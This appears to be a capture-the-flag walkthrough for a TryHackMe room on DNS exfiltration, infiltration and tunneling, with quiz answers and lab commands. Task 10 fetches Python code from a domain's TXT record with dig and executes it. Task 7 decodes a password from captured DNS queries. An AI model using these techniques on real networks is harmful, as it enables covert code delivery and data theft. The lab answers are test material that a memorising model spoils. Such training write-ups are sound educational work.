# DNS Manipulation

## Task 2 Installation

```bash
git clone https://github.com/kleosdc/dns-exfil-infil
cd dns-exfil-infil
pip3 install -r requirements.txt
```

## Task 3 Custom Public DNS Server

{% embed url="https://www.youtube.com/watch?v=p8wbebEgtDk" %}

## Task 4 What is DNS?

#### If you were on Windows, what command could you use to query a txt record for 'youtube.com'?

{% hint style="success" %}
`nslookup -type=TXT youtube.com`
{% endhint %}

#### If you were on Linux, what command could you use to query a txt record for 'facebook.com'?

{% hint style="success" %}
`dig facebook.com TXT`
{% endhint %}

#### AAAA stores what type of IP Address along with the hostname?

{% hint style="success" %}
`IPv6`
{% endhint %}

#### Maximum characters for a DNS TXT Record is 256.

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-04-12.png>)

{% hint style="success" %}
`Nay`
{% endhint %}

#### What DNS Record provides a domain name in reverse-lookup?

{% hint style="success" %}
`PTR`
{% endhint %}

#### What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2)

{% hint style="success" %}
`2.203.168.192.in-addr.arpa`
{% endhint %}

## Task 5 DNS Exfiltration

#### What is the maximum length of a DNS name?

{% embed url="https://stackoverflow.com/questions/32290167/what-is-the-maximum-length-of-a-dns-name" %}

{% hint style="success" %}
`253`
{% endhint %}

## Task 7 DNS Exfiltration - Practice

\
**\~/challenges/exfiltration/orderlist/**&#x20;

#### **ORDER-ID**: 1. What is the Transaction name?&#x20;

```bash
ssh user@10.10.246.21
cat challenges/exfiltration/orderlist/TASK
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-36-46 (1).png>)

```bash
tshark -r challenges/exfiltration/orderlist/order.pcap -Y dns \
       -T fields -e dns.qry.name | sort | uniq -c
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-45-08.png>)

```bash
python3 ~/dns-exfil-infil/packetyGrabber.py
cat order.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-49-33.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-49-48.png>)

{% hint style="success" %}
`Network Equip.`
{% endhint %}

#### **TRANSACTION**: Firewall. How much was the Firewall?

{% hint style="success" %}
`2500`
{% endhint %}

**\~/challenges/exfiltration/identify/**

#### Which file contains suspicious DNS queries?

```bash
cat challenges/exfiltration/identify/TASK
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-53-27.png>)

```bash
tshark -r challenges/exfiltration/identify/cap1.pcap -Y dns \
       -T fields -e dns.qry.name | sort | uniq -c
tshark -r challenges/exfiltration/identify/cap2.pcap -Y dns \
       -T fields -e dns.qry.name | sort | uniq -c
tshark -r challenges/exfiltration/identify/cap3pytho.pcap -Y dns \
       -T fields -e dns.qry.name | sort | uniq -c
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-55-13.png>)

{% hint style="success" %}
`cap3.pcap`
{% endhint %}

```bash
python3 ~/dns-exfil-infil/packetyGrabber.py
cat cap.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-56-42.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-05 22-56-58.png>)

{% hint style="success" %}
`administrator:s3cre7P@ssword`
{% endhint %}

## Task 8 What is DNS Infiltration?

#### What type of DNS Record is usually used to infiltrate data into a network?

{% hint style="success" %}
`TXT`
{% endhint %}

## Task 10 DNS Infiltration - Practice

#### Follow the instructions in the TASK file to complete this question.

#### Enter the output from the executed python file

```bash
dig code.badbaddoma.in TXT | egrep -o 'Ye[^"]*' > code.py
python3 dns-exfil-infil/packetySimple.py
python3 code.py
cat code.py
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 23-09-58.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-05 23-17-07.png>)

{% hint style="success" %}
`4.4.0-186-generic`
{% endhint %}

## Task 11 DNS Tunneling

#### What program was used to Tunnel HTTP over DNS?

{% hint style="success" %}
`iodine`
{% endhint %}

## Task 12 The End

#### There are 2 x 1 Month TryHackMe Voucher codes.

* "The Receipt".
  * In the screenshot of Task 7
* Request. (TXT Record)

```bash
dig badbaddoma.in TXT
```

![](<../../.gitbook/assets/Screenshot from 2022-03-05 23-19-29.png>)
